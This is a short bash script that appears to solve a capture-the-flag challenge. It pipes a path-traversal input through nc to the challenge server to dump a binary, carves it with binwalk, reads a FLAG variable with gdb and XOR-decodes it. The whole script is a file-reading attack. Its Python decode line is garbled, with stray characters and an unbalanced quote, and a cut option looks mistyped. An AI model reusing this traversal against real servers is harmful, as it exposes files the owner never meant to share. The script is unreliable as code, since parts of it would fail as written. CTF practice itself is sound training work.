#!/bin/bash
trap "exit 1" TERM
export TOP_PID=$$

echo "Dumping binary file..."
echo -e "2\n../../../../../home/user/main"|nc -w 2 mngmnt-iface.ctfcompetition.com 1337 >tmp
#at this point I just type in each section by hand so to work this code step by step myself

echo "stripping extra data"
binwalk -e tmp
mv _tmp.extracted/B6.elf .
rm tmp _tmp* -fr
echo "grabbing global var"
pwd=$(gdb -batch -ex 'file ./B6.elf' -ex 'x/s _ZL4FLAG'|cut -d\" -f2|cut -d\/ -fl)
echo "print(\"\".join((chr(ord(x)^int(\"0xc7\", 16)) for x in list('$pwd')|).split(\"}\")[0]+')" > tmp.py
python ./tmp.py
